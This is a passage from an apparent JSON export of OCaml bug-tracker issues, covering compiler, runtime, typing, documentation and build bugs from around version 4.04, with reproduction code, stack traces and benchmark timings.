ID:** 7417\r\n**Reporter:** cullmann\r\n**Assigned to:** @gasche\r\n**Status:** resolved (set by @gasche on 2016-11-27T19:16:36Z)\r\n**Resolution:** fixed\r\n**Priority:** normal\r\n**Severity:** minor\r\n**Platform:** Linux 64-bit\r\n**OS:** openSUSE\r\n**OS Version:** 42.x\r\n**Version:** 4.04.0\r\n**Target version:** 4.04.1+dev\r\n**Fixed in version:** 4.04.1+dev\r\n**Category:** back end (clambda to assembly)\r\n**Tags:** patch\r\n**Monitored by:** @gasche @jmeber\r\n\r\n## Bug description\r\n\r\nWe tried to use OCaml together with the $with_frame_pointers option to have usable perf profiling. As we use clang and not gcc, we were so free to activate that config in configure, too:\r\n\r\nif test \"$with_frame_pointers\" = \"true\"; then\r\n  case \"$target,$cc\" in\r\n    x86_64-*-linux*,gcc*|x86_64-*-linux*,clang*)\r\n       nativecccompopts=\"$nativecccompopts -g  -fno-omit-frame-pointer\"\r\n       bytecccompopts=\"$bytecccompopts -g  -fno-omit-frame-pointer\"\r\n       nativecclinkopts=\"$nativecclinkopts -g\"\r\n       echo \"#define WITH_FRAME_POINTERS\" >> m.h\r\n       ;;\r\n    *) err \"Unsupported architecture with frame pointers\";;\r\n  esac\r\nfi\r\n\r\nUnfortunately, that leads to random segfaults e.g. during unit test execution.\r\n(mostly inside gc routines)\r\n\r\nAs clang normally behaves just like gcc (at least for the C code the ocaml stuff contains), this looks strange. After looking bit at the code to search potential issues that could lead to this, I found in amd64.S that lines:\r\n\r\nLBL(caml_allocN):\r\n        pushq   %rax; CFI_ADJUST(8)        /* save desired size */\r\n        subq    %rax, %r15\r\n        CMP_VAR(caml_young_limit, %r15)\r\n        jb      LBL(103)\r\n        addq    $8, %rsp; CFI_ADJUST (-8)  /* drop desired size */\r\n        ret\r\nLBL(103):\r\n        CFI_ADJUST(8)\r\n        RECORD_STACK_FRAME(8)\r\n#ifdef WITH_FRAME_POINTERS\r\n        /* Do we need 16-byte alignment here ? */\r\n        ENTER_FUNCTION\r\n#endif\r\n        call    LBL(caml_call_gc)\r\n#ifdef WITH_FRAME_POINTERS\r\n        LEAVE_FUNCTION\r\n#endif\r\n        popq    %rax; CFI_ADJUST(-8)       /* recover desired size */\r\n        jmp     LBL(caml_allocN)\r\nCFI_ENDPROC\r\n\r\n=> I would say you need 16-byte alignment here, given older bugs like \r\n\r\nhttps://caml.inria.fr/mantis/print_bug_page.php?bug_id=6038\r\n\r\n=> can it be that this ifdef breaks that? This would mean that with frame pointers is broken for GCC, too, which makes that assumption, but perhaps clang more often triggers that.\r\n\r\n## Steps to reproduce\r\n\r\nSee above, patch configure and compile with clang + frame pointers (we use clang 3.9.0)\r\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7416\n**Reporter:** william\n**Status:** resolved (set by @damiendoligez on 2017-02-17T16:56:56Z)\n**Resolution:** not a bug\n**Priority:** normal\n**Severity:** text\n**Version:** 4.04.0\n**Category:** standard library\n**Monitored by:** @dbuenzli\n\n## Bug description\n\nI feel like since some time the \"coherence\" of the standard library has worsen, probably because of the addition of many new (and undocumented) modules. \r\n\r\nMaybe it is time to group modules by purpose, at least in index.html, in order to better identify what module is available for what purpose ?\r\n\r\nHere is a grouping I made quite quickly to illustrate this. It is likely to have many inconsistencies, I just made an initial guess.\r\n\r\nBest regards\r\n\r\nArg\t\r\nArg_helper\r\nGenlex\t\r\nLexer\t\r\nLexing\t\r\nMarshal\t\r\nParse\t\r\nParser\t\r\nParsing\t\r\n\r\nArray\t\r\nArrayLabels\r\nChar\t\r\nBig_int\t\r\nBigarray\t\r\nBuffer\t\r\nBytes\t\r\nBytesLabels\r\nComplex\t\r\nConsistbl\t\r\nDigest\t\r\nEphemeron\t\r\nFilename\t\r\nFormat\t\r\nGraphics\t\r\nGraphicsX11\r\nHashtbl\t\r\nIdentifiable\t\r\nInt32\t\r\nInt64\t\r\nLazy\t\r\nList\t\r\nListLabels\t\r\nMap\t\r\nMoreLabels\t\r\nMutex\t\r\nNativeint\t\r\nNum\t\r\nNumbers\t\r\nPervasives\t\r\nPrintexc\t\r\nPrintf\t\r\nQueue\t\r\nRandom\t\r\nRatio\t\r\nScanf\t\r\nSet\t\r\nSort\t\r\nStack\t\r\nStdLabels\t\r\nStr\t\r\nStream\t\r\nString\t\r\nStringLabels\t\r\nStrongly_connected_components\t\r\nSys\t\r\nTbl\t\r\nUchar\t\r\nUnix\t\r\nUnixLabels\t\r\nWeak\t\r\n\r\nAst_helper\t\r\nAst_invariants\t\r\nAst_iterator\t\r\nAst_mapper\t\r\nAsttypes\t\r\nAttr_helper\t\r\nBuiltin_attributes\t\r\nLocation\t\r\nLongident\t\r\nParsetree\t\r\nPprintast\t\r\nPrintast\t\r\n\r\nArith_status\r\nCallback\t\r\nCamlinternalFormat\t\r\nCamlinternalFormatBasics\t\r\nCamlinternalLazy\t\r\nCamlinternalMod\t\r\nCamlinternalOO\t\r\nCcomp\r\nClflags\r\nConfig\r\nDepend\t\r\nDocstrings\t\r\nDynlink\t\r\nGc\t\r\nMisc\t\r\nObj\t\r\nOo\t\r\nSpacetime\t\r\nSyntaxerr\t\r\nTerminfo\t\r\nTimings\t\r\nWarnings\t\r\n\r\nCondition\t\r\nEvent\t\r\nThread\t\r\nThreadUnix\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7415\n**Reporter:** william\n**Status:** resolved (set by @Octachron on 2016-12-06T22:28:46Z)\n**Resolution:** open\n**Priority:** normal\n**Severity:** text\n**Version:** 4.04.0\n**Category:** documentation\n\n## Bug description\n\nHello,\r\nin 4.04, looking at the standard library, there are many undocumented modules, or modules written with very specific language. Maybe it would be nice to document them better so that we can use them ? At least, explain the purpose of the module in understandable language, so that if we think we are concerned by that module we start to look for complementary documentation on the web. Or say it is for internal ocaml purposes and that it is unlikely to be reused. Without it I don't even know if I could benefit from the module.\r\n\r\n- Arg_helper ?\r\n\r\n- .Arith_status not mentionned in Floating-point arithmetic documentation\r\n- Ast* ? + make link to Builtin_attributes ?\r\n- Builtin_attributes : rename in Ast_builtin_attributes ?\r\n- Attr_helper : rename in Ast_attr_helper ?\r\n\r\n- Ccomp ?\r\n- Condition : to group with Thead or ThreadUnix ?\r\n- Config ?\r\n- Consistbl ?\r\n- ArrayLabels, ListLabels to be moved in StdLabels ?\r\n- MoreLabels to mark as deprecated ?\r\n- Strongly_connected_components\t?\r\n- Tbl ?\r\n- Terminfo ?\r\n\r\netc...\r\n\r\nBest regards\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7414\r\n**Reporter:** @lpw25\r\n**Assigned to:** @garrigue\r\n**Status:** resolved (set by @garrigue on 2016-11-21T13:22:14Z)\r\n**Resolution:** fixed\r\n**Priority:** normal\r\n**Severity:** minor\r\n**Version:** 4.04.0\r\n**Fixed in version:** 4.05.0 +dev/beta1/beta2/beta3/rc1\r\n**Category:** typing\r\n**Related to:** #6752\r\n**Monitored by:** @gasche @yallop\r\n\r\n## Bug description\r\n\r\nThe interplay between non-generalized type variables and functors seems ill defined and unsound. Using first-class modules we can get a segfault:\r\n```ocaml\r\n  module type T = sig\r\n    type t\r\n    val x : t\r\n    val show : t -> string\r\n  end\r\n\r\n  module Int = struct\r\n    type t = int\r\n    let x = 0\r\n    let show x = string_of_int x\r\n  end\r\n\r\n  module String = struct\r\n    type t = string\r\n    let x = \"Hello\"\r\n    let show x = x\r\n  end\r\n\r\n  let switch = ref true\r\n\r\n  module Choose () = struct\r\n    module Choice =\r\n      (val if !switch then (module Int : T)\r\n           else (module String : T))\r\n    let r = ref (ref [])\r\n  end\r\n\r\n  module type S = sig\r\n    module Choice : T\r\n    val r : Choice.t list ref ref\r\n  end\r\n\r\n  module Force (X : functor () -> S) = struct end\r\n\r\n  module M = Choose ()\r\n\r\n  let () = switch := false\r\n\r\n  module N = Choose ()\r\n\r\n  let () = N.r := !M.r\r\n\r\n  module Ignore = Force(Choose)\r\n\r\n  module M' = (M : S)\r\n\r\n  let () = (!M'.r) := [M'.Choice.x]\r\n\r\n  module N' = (N : S)\r\n\r\n  let () = List.iter (fun x -> print_string (N'.Choice.show x)) !(!N'.r)\r\n```"},{"labels":["bug",null,null],"text":"**Original bug ID:** 7413\n**Reporter:** @rixed\n**Status:** resolved (set by @xavierleroy on 2016-12-03T19:02:09Z)\n**Resolution:** won't fix\n**Priority:** normal\n**Severity:** major\n**Version:** 4.03.0\n**Category:** standard library\n**Related to:** #8090 #8399 #4978 #6154\n\n## Bug description\n\nIt seems (un)marshaling of extensible variant types does not work.\n\n## Steps to reproduce\n\n# type foo = ..;;\r\ntype foo = ..\r\n# type foo += Bla of int;;\r\ntype foo += Bla of int\r\n# let x = Bla 42;;\r\nval x : foo = Bla 42\r\n# let s1 = Marshal.to_string x [];;\r\nval s1 : string =  u\"\\132\\149\\166\\190\\000\\000\\000\\014\\000\\000\\000\\003\\000\\000\\000\\b\\000\\000\\000\\b\\160\\b\\000\\000\\b\\248#Bla\\001\\000\\133j\"\r\n# let x' : foo = Marshal.from_string s1 0;;\r\nval x' : foo = <extension>\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7412\n**Reporter:** @edwintorok\n**Assigned to:** @Octachron\n**Status:** resolved (set by @Octachron on 2017-02-23T23:44:05Z)\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Version:** 4.02.0\n**Category:** documentation\n**Monitored by:** @gasche\n\n## Bug description\n\nThe documentation for Unix.single_write_substring doesn't have a since 4.02 annotation: https://caml.inria.fr/pub/docs/manual-ocaml/libref/Unix.html\r\nOTOH Buffer.add_subbytes has the correct annotation\n\n## Steps to reproduce\n\nView https://caml.inria.fr/pub/docs/manual-ocaml/libref/Unix.html\n\n## Additional information\n\nWhile viewing https://github.com/dbuenzli/jsonm/commit/ba629f79317c6e97a1caa65139583a8cfd461397#diff-48d1573a3f8c418ee1ac7b85e6a0ac30L46 I thought that Unix.single_write_substring could be used instead of the Bytes.unsafe_to_string conversion, however since that library targets 4.01 that function is not available.\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7411\n**Reporter:** kosik\n**Assigned to:** @Octachron\n**Status:** resolved (set by @Octachron on 2017-04-04T15:05:30Z)\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Version:** 4.02.3\n**Fixed in version:** 4.04.1+dev\n**Category:** ocamldoc\n\n## Bug description\n\nIf I have a file with the following contents:\r\n\r\n  module IntSet = Set.Make(struct\r\n                             type t = int\r\n                             let compare = compare\r\n                           end)\r\n\r\nand I use ocamldoc to generate HTML:\r\n\r\n  ocamldoc -html main.ml\r\n\r\nthen the resulting HTML contains some unexpected:\r\n- vertical skip between line\r\n  \"module IntSet: Set.Make(sig\"\r\n  and line\r\n  \"type t = int \"\r\n- even bigger vertical skip between line\r\n  \"type t = int \"\r\n  and line:\r\n  \"val compare : 'a -> 'a -> int\"\r\n\r\nI am (just) guessing that this is not an expected behavior.\n\n## File attachments\n\n- [Main.IntSet.html](https://gist.githubusercontent.com/vicuna/dc8a2c28aba874b2902617f4b25f1cc5/raw/da2a51c3986bf577ce54f515aae4b8dd85e90b8f/Main.IntSet.html)\n"},{"labels":["bug",null,null],"text":"**Original bug ID:** 7410\n**Reporter:** kosik\n**Assigned to:** @Octachron\n**Status:** resolved (set by @gasche on 2016-11-12T16:08:52Z)\n**Resolution:** fixed\n**Priority:** low\n**Severity:** minor\n**Version:** 4.02.3\n**Fixed in version:** 4.04.0\n**Category:** ocamldoc\n**Duplicate of:** #7290\n\n## Bug description\n\nIf I take a file with the following contents:\r\n\r\n  exception E of {foo:unit}\r\n\r\nand when I run the following command:\r\n\r\n  ocamldoc main.ml\r\n\r\nthen ocamldoc prints:\r\n\r\n  Compilation error(File \"odoc_ast.ml\", line 1384, characters 37-43: Assertion failed). Use the OCaml compiler to get more details.\r\n\r\ndespite the fact that the same file is accepted without problems by ocamlc.\n"},{"labels":["bug"],"text":"**Original bug ID:** 7407\n**Reporter:** shayne_fletcher\n**Status:** resolved (set by @xavierleroy on 2017-02-23T15:46:22Z)\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Version:** 4.04.0\n**Fixed in version:** 4.05.0 +dev/beta1/beta2/beta3/rc1\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\n`cc -V` gives, \"cc: Sun C 5.12 SunOS_sparc Patch 148917-07 2013/10/18\"\r\nwhich according to\r\nhttp://www.oracle.com/technetwork/server-storage/solarisstudio/training/index-jsp-141991.html\r\nseems to indicate, Oracle Solaris Studio 12.3, C Compiler 5.12.\r\n\r\n(1) C99 required:\r\n  - Resolution:\r\n    - Add `-xc99=all` to the compiler flags\r\n\r\n(2) Problems with the newly added `CAML_SYS_EXIT` macro:\r\n  - Defined in 'ocaml/byterun/caml/misc.h' \r\n  - The problem is:\r\n\r\n     ```\r\n     #define CAML_SYS_EXIT(retcode) \\\r\n       CAML_SYS_PRIM_1(CAML_CPLUGINS_EXIT,exit,retcode)\r\n      ```\r\n      ultimately reduces to something like,\r\n\r\n      ```\r\n      (caml_cplugins_prim == NULL) ? prim(arg1) :\r\n         caml_cplugins_prim(code,(intnat) (arg1),0,0)\r\n     ```\r\n    Where `exit` is concerned, the 'then' part of the conditional evaluates to `void`, the 'else' part of the conditional evaluates to `long`. This is a hard error for this compiler.\r\n\r\n  - Resolution:\r\n\r\n    - Modify 'ocaml/byterun/sys.c' and 'ocaml/byterun/printexc.c', replacing occurences of `CAML_SYS_EXIT(2)` with\r\n\r\n     ```\r\n     #if defined(__SUNPRO_C)\r\n       exit (2);\r\n     #else\r\n       CAML_SYS_EXIT(2);\r\n     #endif /*defined __SUNPRO_C*/\r\n     ```\r\n(3) Unresolved symbols linking 'objinfo_helper'\r\n  - The problem here is due to newly added code to 'caml/alloc.h':\r\n\r\n       ```\r\n       static inline value caml_alloc_boxed (value arg) {\r\n         value result = caml_alloc_small (1, 0);\r\n          ...\r\n       }\r\n       ```\r\n\r\n     Despite not being called from 'objinfo_helper.c', this morally  induces a link dependency of `objinfo_helper`on 'libcamlrun.a' which in turn obligates a dependency on `prims.o`.\r\n\r\n  - Resolution:\r\n    - Add `-Xlinker -znodefs` to the compiler flags to permit unresolved dependencies (note : not a recommended practice, maybe better to not have these `static inline` constructions in the header at all).\n"},{"labels":["bug",null,null],"text":"**Original bug ID:** 7406\n**Reporter:** igo_weiqi_baduk\n**Assigned to:** @gasche\n**Status:** resolved (set by @gasche on 2016-11-10T13:38:14Z)\n**Resolution:** duplicate\n**Priority:** normal\n**Severity:** minor\n**OS:** Linux x86_64\n**Version:** 4.04.0\n**Category:** -for ocamlbuild use https://github.com/ocaml/ocamlbuild/issues\n\n## Bug description\n\nocamlbuild 0.9.3 & OCaml 4.04.0+flambda & OPAM 2.0~alpha4\r\n\r\ne.g.\r\n$ ocamlbuild foo.a.native\r\n-> Failure: Link list cannot be empty\r\n\r\nMessage present only when the filename contains 2 (or more) '.' \r\n\r\nOK with foo.a.byte (or foo.native)\n"},{"labels":[null,"bug"],"text":"**Original bug ID:** 7405\n**Reporter:** Richard Jones\n**Status:** resolved (set by @xavierleroy on 2016-11-11T18:47:57Z)\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** crash\n**Platform:** s390x\n**OS:** Fedora\n**OS Version:** 26\n**Version:** 4.04.0\n**Fixed in version:** 4.05.0 +dev/beta1/beta2/beta3/rc1\n**Category:** back end (clambda to assembly)\n**Monitored by:** @gasche\n\n## Bug description\n\nbin/coqtop -boot   -native-compiler -compile theories/Init/Prelude.v  -noinit -R theories Coq\r\nMakefile.build:590: recipe for target 'theories/Init/Prelude.vo' failed\r\nmake[1]: *** [theories/Init/Prelude.vo] Segmentation fault (core dumped)\r\n\r\nI'm afraid I don't have very much detail, but I am able to get\r\na core file.\r\n\r\nHere is the stack trace according to gdb:\r\n\r\nCore was generated by `bin/coqtop -boot -native-compiler -compile theories/Init/Prelude.v -noinit -R t'.\r\nProgram terminated with signal SIGSEGV, Segmentation fault.\r\n#0  0x0000020080995e22 in ?? ()\r\n[Current thread is 1 (Thread 0x2003db32870 (LWP 4231))]\r\n(gdb) bt\r\n#0  0x0000020080995e22 in ?? ()\r\n#1  0x000002005b1ccfdc in camlG_extraction__entry ()\r\n    at plugins/extraction/g_extraction.ml4:22\r\n#2  0x000003ffd81f91c0 in ?? ()\r\nPC not saved\r\n(gdb) frame 1\r\n#1  0x000002005b1ccfdc in camlG_extraction__entry ()\r\n    at plugins/extraction/g_extraction.ml4:22\r\n22\tARGUMENT EXTEND mlname\r\n\r\nThe disassembly is below.  Current program counter is marked with \"=>\"\r\n\r\nDump of assembler code for function camlG_extraction__entry:\r\n   0x000002005b1ccf30 <+0>:\tlay\t%r15,-40(%r15)\r\n   0x000002005b1ccf36 <+6>:\tstg\t%r14,32(%r15)\r\n   0x000002005b1ccf3c <+12>:\tlgrl\t%r3,0x2005b214fa0\r\n   0x000002005b1ccf42 <+18>:\tlgrl\t%r4,0x2005b2159a8\r\n   0x000002005b1ccf48 <+24>:\tstg\t%r3,0(%r4)\r\n   0x000002005b1ccf4e <+30>:\tbrasl\t%r14,0x2005b1ccf7a <camlG_extraction__entry+74>\r\n   0x000002005b1ccf54 <+36>:\tlgrl\t%r9,0x2005b2152d0\r\n   0x000002005b1ccf5a <+42>:\tlg\t%r12,16(%r9)\r\n   0x000002005b1ccf60 <+48>:\tcgr\t%r2,%r12\r\n   0x000002005b1ccf64 <+52>:\tjgne\t0x2005b1ccf74 <camlG_extraction__entry+68>\r\n   0x000002005b1ccf6a <+58>:\tlghi\t%r6,1\r\n   0x000002005b1ccf6e <+62>:\tjg\t0x2005b1cd00a <camlG_extraction__entry+218>\r\n   0x000002005b1ccf74 <+68>:\tbrasl\t%r14,0x20080995e22\r\n   0x000002005b1ccf7a <+74>:\tlay\t%r15,-16(%r15)\r\n   0x000002005b1ccf80 <+80>:\tstg\t%r14,0(%r15)\r\n   0x000002005b1ccf86 <+86>:\tstg\t%r13,8(%r15)\r\n   0x000002005b1ccf8c <+92>:\tlgr\t%r13,%r15\r\n   0x000002005b1ccf90 <+96>:\tlgrl\t%r5,0x2005b215140\r\n   0x000002005b1ccf96 <+102>:\tlg\t%r2,32(%r5)\r\n   0x000002005b1ccf9c <+108>:\tbrasl\t%r14,0x2005b182198 <camlGenarg__default_empty_value_2063@plt>\r\n   0x000002005b1ccfa2 <+114>:\tcgfi\t%r2,1\r\n   0x000002005b1ccfa8 <+120>:\tjge\t0x2005b1ccfba <camlG_extraction__entry+138>\r\n   0x000002005b1ccfae <+126>:\tlg\t%r8,0(%r2)\r\n   0x000002005b1ccfb4 <+132>:\tjg\t0x2005b1ccfdc <camlG_extraction__entry+172>\r\n   0x000002005b1ccfba <+138>:\tlgrl\t%r9,0x2005b215458\r\n   0x000002005b1ccfc0 <+144>:\tlghi\t%r12,0\r\n   0x000002005b1ccfc4 <+148>:\tsty\t%r12,0(%r9)\r\n   0x000002005b1ccfca <+154>:\tlgrl\t%r2,0x2005b2152d0\r\n   0x000002005b1ccfd0 <+160>:\tlg\t%r2,16(%r2)\r\n   0x000002005b1ccfd6 <+166>:\tbrasl\t%r14,0x20080995e22\r\n=> 0x000002005b1ccfdc <+172>:\tlay\t%r11,-16(%r11)\r\n   0x000002005b1ccfe2 <+178>:\tclgr\t%r11,%r10\r\n   0x000002005b1ccfe6 <+182>:\tjgl\t0x2005b1d09a2 <camlG_extraction__entry+14962>\n\n## Steps to reproduce\n\nCompile coq from source on s390x with OCaml 4.04.0\n\n## Additional information\n\nFedora has some patches on top of OCaml 4.04.0, but not many and\r\nI don't believe any of them are relevant to this bug.  However you\r\ncan find the patches here in case:\r\n\r\nhttps://git.fedorahosted.org/cgit/fedora-ocaml.git/log/?h=fedora-26-4.04.0\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7403\n**Reporter:** talex\n**Assigned to:** @gasche\n**Status:** resolved (set by @gasche on 2016-11-07T19:34:09Z)\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** major\n**Version:** 4.04.0\n**Fixed in version:** 4.04.1+dev\n**Category:** standard library\n\n## Bug description\n\nThere seems to be a bug in the new Set.map in 4.04.\r\n\r\nI think perhaps the two v variables here should be v':\r\n\r\nhttps://github.com/ocaml/ocaml/blob/d27c578954bd92af79ff5bf92a93d6aef81b1acd/stdlib/set.ml#L387\n\n## Steps to reproduce\n\nmodule S = Set.Make(String)\r\n\r\nlet f = function\r\n  | \"b\" -> \"z\"\r\n  | x -> x\r\n\r\nlet () =\r\n  let a = S.of_list [\"b\"; \"a\"; \"c\"] in\r\n  let b = S.map f a in\r\n  print_endline \"Elements of b:\";\r\n  S.iter (Printf.printf \"- %s\\n\") b;\r\n  let b_has x =\r\n    Printf.printf \"%S in b = %b\\n\" x (S.mem x b) in\r\n  List.iter b_has [\"a\"; \"b\"; \"c\"; \"z\"]\r\n\r\nProduces:\r\n\r\nElements of b:\r\n- a\r\n- z\r\n- c\r\n\"a\" in b = true\r\n\"b\" in b = false\r\n\"c\" in b = false\r\n\"z\" in b = true\n"},{"labels":["bug",null,null],"text":"**Original bug ID:** 7402\n**Reporter:** kosik\n**Assigned to:** @garrigue\n**Status:** closed (set by @garrigue on 2017-03-14T03:23:07Z)\n**Resolution:** duplicate\n**Priority:** normal\n**Severity:** minor\n**Version:** 4.02.3\n**Target version:** later\n**Category:** typing\n**Duplicate of:** #4791 #6323\n\n## Bug description\n\nWhen I tried to use \"ocamlc -i ...\" command to generate \"*.mli\" files, I have noticed that the generated files are not always compilable (for various reasons).\r\n\r\nI've attached the files that reproduce the problem in the simplest possible context.\r\n\r\nIndividual files:\r\n\r\n  (* the contents of \"m.mli\" *)\r\n\r\n  type t\r\n  val v : t\r\n\r\n  ???????????????????????????????????????????????????\r\n\r\n  (* the contents of \"main.ml\" *)\r\n\r\n  module M = struct\r\n    let v = M.v\r\n  end\r\n\r\n  let v = M.v\r\n\r\n  ???????????????????????????????????????????????????\r\n\r\n  # the contents of \"Makefile\"\r\n\r\n  main.cmi m.cmi : %.cmi : %.mli\r\n  \tocamlc -c $<\r\n\r\n  main.mli : main.ml m.cmi\r\n  \tocamlc -i $< > $@\r\n\r\n  main.cmi : m.cmi\r\n\r\nThe following command (unsurprisingly) succeeds:\r\n\r\n  ocamlc -c m.mli\r\n\r\nThe following command \"succeeds\":\r\n\r\n  ocamlc -i main.ml > main.mli\r\n\r\nbut it generates \"main.mli\" which does not make sense:\r\n\r\n  module M : sig val v : M.t end\r\n  val v : M.t\r\n\r\nOf course, an attempt to compile it fails:\r\n\r\n  ocamlc -c main.mli\r\n\r\n    File \"main.mli\", line 2, characters 8-11:\r\n    Error: Unbound type constructor M.t\r\n\r\nI think this is a bug because if \"ocamlc -i ...\" generates a mli-file and exits with an exit-status 0, it is natural to assume that it is supposed to be compilable.\r\n\r\nI am not sure what is the best way to fix this. There are at least two possibilities:\r\n\r\n(1)\r\n\r\nConsidering the fact that this:\r\n\r\n  module M = struct end\r\n  module M = struct end\r\n\r\nis already rejected by \"ocamlc\", it seems sensible to change the definition of the Ocaml language so that shadowing of global modules locally will not be allowed. Consequently, \"ocamlc -i ...\" can generate mli-file that makes sense.\r\n\r\n(2)\r\n\r\nOr we can keep the language definition as it is, (allowing shadowing of global modules locally, even though shadowing of local modules locally is already forbidden), and just make sure that if \"ocamlc -i\" cannot generate mli-file that is compilable, it will not generate anything, print a sensible error message (explaining to th user why that is not possible) and exit with an appropriate exit-code.\n\n## Steps to reproduce\n\ntar xvzf files.tar.gz\r\nmake\n\n## File attachments\n\n- [files.tar.gz](https://gist.githubusercontent.com/vicuna/85fa5588e419f1f690128c59ecce0f38/raw/bd227323cc61ef4802167dc84e52fb582bd0f513/files.tar.gz)\n"},{"labels":["bug",null,null],"text":"**Original bug ID:** 7401\r\n**Reporter:** @c-cube\r\n**Assigned to:** @garrigue\r\n**Status:** closed (set by @garrigue on 2016-12-10T02:01:01Z)\r\n**Resolution:** duplicate\r\n**Priority:** normal\r\n**Severity:** minor\r\n**Target version:** 4.05.0 +dev/beta1/beta2/beta3/rc1\r\n**Category:** typing\r\n**Duplicate of:** #7313\r\n**Related to:** #6752\r\n**Monitored by:** @yallop\r\n\r\n## Bug description\r\n\r\nA package that builds normally on 4.01, 4.02, 4.03 fails on 4.04.0+beta2 as follows:\r\n```\r\n# Error: The implementation src/core/Transform.ml\r\n# [...]\r\n#        ...\r\n#        In module Features:\r\n#        Values do not match:\r\n#          val update_l : (key * '_a) list -> '_a M.t -> '_a M.t\r\n#        is not included in\r\n#          val update_l : (key * value) list -> t -> t\r\n#        File \"src/core/Transform.ml\", line 58, characters 6-14:\r\n#          Actual declaration\r\n```\r\nThis is quite simple code, but it appears that, in the .ml file, the inferred type contains '_a variables that would later be bound to concrete types thanks to the .mli.\r\n\r\n## Steps to reproduce\r\n```\r\nopam sw 4.04.0+beta2\r\nwget https://github.com/nunchaku-inria/nunchaku/archive/0.3.tar.gz\r\ntar xvf 0.3.tar.gz\r\ncd nunchaku-0.3\r\nopam install ocamlfind containers sequence menhir\r\n./configure --disable-random\r\nmake\r\n```\r\n\r\nshould lead to this error.\r\n\r\n## Additional information\r\n\r\ndiscovered in https://travis-ci.org/ocaml/opam-repository/jobs/173265123\r\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7399\n**Reporter:** @dra27\n**Assigned to:** @dra27\n**Status:** resolved (set by @xavierleroy on 2017-10-19T13:31:46Z)\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Version:** 4.05.0 +dev/beta1/beta2/beta3/rc1\n**Target version:** later\n**Fixed in version:** 4.06.0 +dev/beta1/beta2/rc1\n**Category:** platform support (windows, cross-compilation, etc)\n\n## Bug description\n\nVarious tests in the testsuite when run on Windows must use Unix line-endings for certain input and reference files. In certain situations, a git clone working tree can end up with files with the wrong line endings and tests fail.\n\n## Additional information\n\nBest fix is probably a Windows-only shell script \"parsing\" .gitattributes and checking the results (using file, dos2unix, etc.)\n"},{"labels":["bug",null,null],"text":"**Original bug ID:** 7397\n**Reporter:** @hhugo\n**Assigned to:** @garrigue\n**Status:** closed (set by @damiendoligez on 2016-11-04T14:51:27Z)\n**Resolution:** fixed\n**Priority:** urgent\n**Severity:** block\n**Target version:** 4.04.0 +dev / +beta1 / +beta2\n**Fixed in version:** 4.04.0 +dev / +beta1 / +beta2\n**Category:** typing\n**Monitored by:** @garrigue\n\n## Bug description\n\nThe ocaml compiler never terminate on one of the file of the js_of_ocaml codebase.\r\n\r\nSee below for a minimal example.\n\n## Steps to reproduce\n\ncompile the following program with ocamlc/ocamlopt\r\n\r\ntype +'a t\r\n\r\nclass type a = object\r\n  method b : b\r\nend\r\n\r\nand b = object\r\n  method a : a\r\nend\r\n\r\ntype _ response =\r\n  | C : #a t response\r\n\r\nlet f (type a) (a : a response) =\r\n  match a with\r\n  | C -> 0\n\n## Additional information\n\nThis is using an up to date 4.04.0+trunk opam switch\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7396\n**Reporter:** berke.durak\n**Assigned to:** @mshinwell\n**Status:** resolved (set by @mshinwell on 2016-11-03T07:29:09Z)\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** major\n**Platform:** Amd64\n**OS:** Debian\n**OS Version:** stretch\n**Target version:** 4.04.0 +dev / +beta1 / +beta2\n**Fixed in version:** 4.04.0 +dev / +beta1 / +beta2\n**Category:** middle end (typedtree to clambda)\n\n## Bug description\n\nI compiled and ran a simple matrix-multiplication-style benchmark program written in imperative style with Bigarrays (see below) using versions 4.01.0, 4.03.0, 4.03.0+flambda, 4.04.0+trunk+flambda (with -version 4.04.0+dev9-2015-09-05), 4.04.0+beta2+flambda (4.04.0+beta2) and 4.05+trunk+flambda (4.05.0+dev0-2016-08-01).\r\n\r\nExecution time increased by a factor of 2.3 from 4.03+flambda to 4.04+trunk+flambda.  I tried a few of the newer optimization switches (-rounds X, -unboxed-types, -unbox-closures, etc.) but that didn't make a significant difference. \r\n\r\nExecution times, repeatable within ~ 5%:\r\n\r\n4.01.0                5.45s\r\n4.03.0                4.28s\r\n4.03.0+flambda        4.44s\r\n4.04.0+trunk+flambda  10.45s\r\n4.04.0+beta2+flambda 10.72s\r\n4.05.0+trunk+flambda  10.36s\n\n## Steps to reproduce\n\nCompile attached bigarrtst.ml with different compiler versions and inspect execution time.\n\n## Additional information\n\nPosted to caml-list on 2016-10-30, David Allsopp did some bisection:\r\n\r\n> I've bisected and identified commit f7dcb as the problem (it was added to trunk after 4.03 was branched). The specific issue is the change in https://github.com/ocaml/ocaml/blob/trunk/bytecomp/simplif.ml#L473 disabling conversion of refs to mutable variables when flambda is enabled. If you remove the `&& Config.flambda = false` and rebuild ocamlopt, you should find your benchmark speed restored. flambda is supposed to be performing that optimisation itself, so something is clearly (very) wrong!\n\n## File attachments\n\n- [bigarrtst.ml](https://gist.githubusercontent.com/vicuna/4d6b7cb78a4ae6b33b29ba676c487427/raw/61db98883376de7cb2604c5497a09df63a8154fb/bigarrtst.ml)\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7395\n**Reporter:** @nojb\n**Assigned to:** @garrigue\n**Status:** resolved (set by @garrigue on 2016-10-27T21:11:06Z)\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Fixed in version:** 4.04.0 +dev / +beta1 / +beta2\n**Category:** typing\n**Child of:** #7391\n\n## Bug description\n\nCommit 9a2015 seems caused a small regression in the typechecker:\r\n\r\ntype u\r\ntype 'a t = u\r\nlet c (f : u -> u) =\r\n  object\r\n    method apply: 'a. 'a t -> 'a t = fun x -> f x\r\n  end\r\n\r\nno longer typechecks.  To fix it is enough to add some type annotation:\r\n\r\n...\r\n  method apply: 'a. 'a t -> 'a t = fun x -> (f : u -> 